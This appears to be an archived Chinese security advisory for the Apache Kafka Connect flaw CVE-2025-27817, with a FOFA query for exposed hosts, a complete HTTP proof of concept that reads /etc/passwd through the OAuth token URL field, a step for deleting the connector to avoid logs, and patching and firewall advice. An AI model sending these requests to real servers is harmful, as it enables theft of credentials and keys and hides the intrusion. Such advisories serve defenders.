@@ -1,0 +1,209 @@
+---
+cve: "CVE-2025-27817"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【漏洞预警】Apache Kafka Connect高危漏洞（CVE-2025-27817）可致任意文件读取,影响核心数据安全！  
+ HK安全小屋   2025-06-12 15:27  
+  
+![图片](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
+  
+6月9日，Apache Kafka官方披露了多个安全漏洞:  
+  
+CVE-2025-27819：  
+通过 SASL JAAS JndiLoginModule 配置发起 RCE/拒绝服务攻击（利用此漏洞需要  
+集群资源的 AlterConfigs 权限  
+）  
+  
+CVE-2025-27818：  
+可能通过 SASL JAAS LdapLoginModule 配置发起 RCE 攻击（利用此漏洞需经过身份验证的攻击者修改‘  
+asl.jaas.config”属性“）  
+  
+CVE-2025-27817：  
+Apache Kafka 客户端任意文件读取和 SSRF 漏洞（  
+允许未经身份验证的攻击者利用该漏洞实现任意文件读取  
+）  
+  
+大多数据处理中间件或流式处理框架，如：Apache Spark Structured Streaming、  
+Apache Druid等  
+在应用中需要调用Kafka Connect组件，  
+而这些服务会存储大量的核心业务系统敏感数据，一旦被攻击将造成更加严重的数据泄密  
+。  
+  
+  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzEDnzsj0fDTW87vANxGKHrVqOLtBbgQCiacbWk8bQVMpGhUiatNDn8s2rQ/640?wx_fmt=png&from=appmsg "")  
+  
+### 【资产暴露面分析】  
+  
+我们通过FOFA搜索引擎查询公网中受影响资产情况，搜索语句如下：  
+```
+header="Jetty" && body="kafka_cluster_id"
+```  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzEMzL93EGQ431I9TK2mhLygPada9vYFsuvJgHFD9fP1UiadKHpNMOmgrw/640?wx_fmt=png&from=appmsg "")  
+  
+  
+FOFA搜索结果显示，暴露在公网的相关资产数量超  
+3800  
++。  
+  
+【漏洞原理分析】  
+  
+我们基于Apache Kafka官网发布的漏洞描述，深入分析该漏洞：  
+  
+在 Apache Kafka 客户端 3.1.0 至 3.9.0 版本中，部分与认证相关的配置字段（如   
+  
+sasl.oauthbearer.token.endpoint.url  
+）允许设置为 file://  
+ 协议  
+。  
+  
+由于客户端未对该 URL 协议进行有效校验，导致可将本地文件内容作为 OAuth Token 加载——  
+只要攻击者能够控制这些字段的值，即可触发漏洞  
+。  
+  
+其中，  
+Kafka Connect 是一个高危的漏洞触发场景  
+：  
+- 在分布式模式下，其默认暴露 REST API（端口 8083）；  
+  
+- 支持远程创建/修改连接器；  
+  
+可通过 JSON 请求直接注入恶意字段，如：  
+```
+"sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd"
+```  
+- 配置支持动态生效，无需重启，极易被脚本化利用。  
+  
+这些特性叠加，使原本应仅影响客户端配置安全的问题  
+，  
+演变为一个可远程利用的任意文件读取漏洞  
+，大大提升了攻击风险。  
+### 【漏洞复现】  
+#### Step 1：构造恶意连接器  
+  
+向 Kafka Connect 的 /connectors  
+ 接口发送 POST 请求，创建带有 file:///etc/passwd  
+ 的连接器：  
+```
+POST /connectors HTTP/1.1
+Host: 127.0.0.1:8083
+Content-Type: application/json
+{
+ "name": "malicious-connector",
+ "config": {
+  "connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
+  "tasks.max": "1",
+  "source.cluster.alias": "source-0",
+  "target.cluster.alias": "target-0",
+  "source.cluster.bootstrap.servers": "127.0.0.1:9092",
+  "target.cluster.bootstrap.servers": "127.0.0.1:9092",
+  "producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd",
+  "producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginCallbackHandler",
+  "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required serviceName=\"exploit\";",
+  "producer.override.sasl.mechanism": "OAUTHBEARER",
+  "value.converter": "org.apache.kafka.connect.converters.ByteArrayConverter",
+  "key.converter": "org.apache.kafka.connect.converters.ByteArrayConverter"
+ }
+}
+```  
+  
+核心利用字段：  
+```
+"producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd"
+```  
+  
+正常用途：Kafka ⽀持通过 OAuth2 从远程URL（如HTTPS认证服务器）获取令牌。  
+  
+恶意用途：攻击者将URL设置为file:///etc/passwd，Kafka客户端将从本地磁盘读取/etc/passwd内容作为令牌。如果未配置allowed.urls白名单，Kafka将执行此读取操作。  
+  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzEfxZKLorj0jWzc8yHubO5mRsfgKgzhx1xepias2JArOMGhQQXvcb1ROQ/640?wx_fmt=png&from=appmsg "")  
+  
+#### Step 2：触发连接器重启  
+  
+由于配置可能不会立即生效，攻击者需通过以下请求触发漏洞逻辑执行：  
+```
+POST /connectors/malicious-connector/restart HTTP/1.1
+Host: 127.0.0.1:8083
+```  
+#### Step 3：读取响应信息  
+  
+可通过以下接口查看连接器状态和错误信息，判断漏洞是否生效：  
+```
+GET /connectors/malicious-connector/status HTTP/1.1
+Host: 127.0.0.1:8083
+```  
+  
+  
+若系统未屏蔽敏感错误响应，可能在返回信息中看到/etc/passwd  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzEKvanseJ6tbqwx1BvmrC0wKicLibZ5ACgBjYfBAAKkdIjvcVnDRvaYl0A/640?wx_fmt=png&from=appmsg "")  
+  
+#### Step 4：删除痕迹  
+  
+为避免日志留痕，可通过 DELETE 请求删除恶意连接器：  
+```
+DELETE /connectors/malicious-connector HTTP/1.1
+Host: 127.0.0.1:8083
+```  
+  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzExcZAdQm4oNicQiczib8UqNNBeh4vnrPB6ibvKfvRH4KSQkZVbvs9vzQwzg/640?wx_fmt=png&from=appmsg "")  
+  
+### 【漏洞危害】  
+- 任意  
+文件读取  
+：  
+可读  
+取如  
+/etc/shadow、/root/.ssh/id_rsa等  
+敏感文件，威胁服务器安全。  
+  
+- 攻击者可将URL替换为内网地址（如http://127.0.0.1:8080/actuator/env），从而攻击内网服务。  
+  
+- 权限提升：  
+配合其他漏洞或配置不当，攻击者可能进一步提升权限，最终完全控制Kafka Connect实例或其主机。  
+  
+- 配合信息泄露进一步渗透  
+：  
+例如通过泄露数据库配置，攻击者可进一步入侵业务系统、访问数据，甚至进行篡改。  
+  
+### 【安全加固建议】  
+- 升级Kafka  
+：Kafka官方已发布安全修复版本，请尽快升级至 3.9.1及以上版本，下载地址：https://github.com/apache/kafka/releases/tag/3.9.1  
+  
+- 配置URL白名单  
+：设置  
+allowed.urls限  
+制可访问的URL范围。  
+  
+- 限制REST接口访问  
+：关闭8083端口或启用访问认证机制。  
+  
+- 防火墙加固  
+：使用防火墙限制Kafka Connect接口访问，仅允许可信内网IP。  
+  
+```
+iptables -A INPUT -p tcp --dport 8083 ! -s 192.168.1.0/24 -j DROP
+```  
+```
+
+```  
+### Goby已完成CVE-2025-27817无损检测及EXP验证复现  
+  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLI6EZmeCx116HybctXMibzEnsaYJvGXlR9GbGklmlgoPjoDibp5QfPvQJ24fibOSWCvLiaiaDEgS6pAUg/640?wx_fmt=png&from=appmsg "")  
+  
+Goby欢迎表哥/表姐们加入我们的社区大家庭，一起交流技术、生活趣事、奇闻八卦，结交无数白帽好友。  
+  
+也欢迎投稿到Goby（Goby介绍/扫描/口令爆破/漏洞利用/插件开发/PoC编写/IP库使用场景/Webshell/漏洞分析等文章均可），审核通过后可奖励Goby标准版，快来加入吧~~~  
+  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIiabR1dAPwPUfdMicdAYjpI64IJvW0ibvQHibec1lKpI5j2gBSHics8h2nBF9PRHv3NwauicLyB5lEWfmQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
